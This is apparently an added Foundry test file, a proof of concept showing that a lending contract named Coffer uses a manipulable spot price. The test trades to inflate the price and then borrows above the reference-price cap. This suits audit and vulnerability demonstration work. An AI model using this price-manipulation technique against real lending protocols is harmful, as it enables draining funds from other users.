+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.28;
+
+import {Test} from "forge-std/Test.sol";
+import {Coffer} from "../src/Coffer.sol";
+
+contract PocTest is Test {
+    function test_exploit() public {
+        Coffer pool = new Coffer(1000, 1000, 1e18);
+        // deposit collateral
+        pool.credit(100);
+
+        // manipulate price: reduce base reserve to inflate instantPrice
+        // initial instantPrice = 1000*1e18/1000 = 1e18
+        // after trade(0,800): poolBase=200, quoteAmt=1000 => instantPrice=5e18
+        pool.trade(0, 800);
+
+        uint256 instant = pool.instantPrice();
+        uint256 ref = pool.refQuote();
+
+        // instant price is manipulated higher than ref
+        assertGt(instant, ref, "instant not manipulated");
+
+        uint256 capRef = pool.collateralOf(address(this)) * ref / 1e18;
+        uint256 capInstant = pool.collateralOf(address(this)) * instant / 1e18;
+        assertGt(capInstant, capRef, "manipulation did not increase cap");
+
+        // Borrow more than reference cap - should succeed due to bug
+        pool.takeLoan(capRef + 1);
+
+        uint256 loan = pool.loanOf(address(this));
+        // loan exceeds reference-based cap => vulnerability demonstrated
+        assertGt(loan, capRef, "exploit failed: loan not > ref cap");
+    }
+}

